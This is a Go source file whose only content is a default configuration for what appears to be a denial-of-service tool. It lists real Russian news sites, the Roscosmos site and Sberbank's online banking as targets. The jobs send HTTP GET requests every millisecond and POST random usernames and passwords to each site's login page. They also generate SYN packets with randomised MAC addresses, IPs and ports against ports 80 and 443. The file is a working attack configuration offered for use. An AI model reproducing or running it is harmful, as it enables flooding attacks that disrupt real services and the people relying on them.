package config

var DefaultConfig = `{
	"jobs": [
	  {
		"type": "http",
		"args": {
		  "method": "GET",
		  "path": "https://lenta.ru/",
		  "interval_ms": 1
		}
	  },
	  {
		"type": "http",
		"args": {
		  "method": "GET",
		  "path": "https://rg.ru/",
		  "interval_ms": 1
		}
	  },
	  {
		"type": "http",
		"args": {
		  "method": "GET",
		  "path": "https://interfax.ru/",
		  "interval_ms": 1
		}
	  },
	  {
		"type": "http",
		"args": {
		  "method": "GET",
		  "path": "https://roscosmos.ru/",
		  "interval_ms": 1
		}
	  },
	  {
		"type": "http",
		"args": {
		  "method": "GET",
		  "path": "https://ria.ru/",
		  "interval_ms": 1
		}
	  },
	  {
		"type": "http",
		"args": {
		  "method": "GET",
		  "path": "https://online.sberbank.ru/",
		  "interval_ms": 1
		}
	  },
	  {
		"type": "http",
		"args": {
		  "method": "POST",
		  "path": "https://lenta.ru/login",
		  "body": {
			"login": "{{ random_uuid }}",
			"password": "{{- random_int -}}{{- random_int -}}{{- random_int -}}{{- random_int -}}"
		  },
		  "interval_ms": 100
		}
	  },
	  {
		"type": "http",
		"args": {
		  "method": "POST",
		  "path": "https://rg.ru/login",
		  "body": {
			"login": "{{ random_uuid }}",
			"password": "{{- random_int -}}{{- random_int -}}{{- random_int -}}{{- random_int -}}"
		  },
		  "interval_ms": 100
		}
	  },
	  {
		"type": "http",
		"args": {
		  "method": "POST",
		  "path": "https://interfax.ru/login",
		  "body": {
			"login": "{{ random_uuid }}",
			"password": "{{- random_int -}}{{- random_int -}}{{- random_int -}}{{- random_int -}}"
		  },
		  "interval_ms": 100
		}
	  },
	  {
		"type": "http",
		"args": {
		  "method": "POST",
		  "path": "https://roscosmos.ru/login",
		  "body": {
			"login": "{{ random_uuid }}",
			"password": "{{- random_int -}}{{- random_int -}}{{- random_int -}}{{- random_int -}}"
		  },
		  "interval_ms": 100
		}
	  },
	  {
		"type": "http",
		"args": {
		  "method": "POST",
		  "path": "https://ria.ru/login",
		  "body": {
			"login": "{{ random_uuid }}",
			"password": "{{- random_int -}}{{- random_int -}}{{- random_int -}}{{- random_int -}}"
		  },
		  "interval_ms": 100
		}
	  },
	  {
		"type": "http",
		"args": {
		  "method": "POST",
		  "path": "https://online.sberbank.ru/login",
		  "body": {
			"login": "{{ random_uuid }}",
			"password": "{{- random_int -}}{{- random_int -}}{{- random_int -}}{{- random_int -}}"
		  },
		  "interval_ms": 100
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "lenta.ru",
		  "port": "80",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "lenta.ru",
		  "port": "443",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "rg.ru",
		  "port": "80",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "rg.ru",
		  "port": "443",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "interfax.ru",
		  "port": "80",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "interfax.ru",
		  "port": "443",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "roscosmos.ru",
		  "port": "80",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "roscosmos.ru",
		  "port": "443",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "ria.ru",
		  "port": "80",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "ria.ru",
		  "port": "443",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "online.sberbank.ru",
		  "port": "80",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  },
	  {
		"type": "packetgen",
		"args": {
		  "host": "online.sberbank.ru",
		  "port": "443",
		  "packet": {
			"payload": "{{ random_payload 100 }}",
			"ethernet": {
			  "src_mac": "{{ random_mac_addr }}",
			  "dst_mac": "{{ random_mac_addr }}"
			},
			"ip": {
			  "src_ip": "{{ local_ip }}",
			  "dst_ip": "{{ random_ip }}"
			},
			"tcp": {
			  "src_port": "{{ random_port }}",
			  "dst_port": "{{ random_port }}",
			  "flags": {
				"syn": true
			  }
			}
		  }
		}
	  }
	]
  }
`
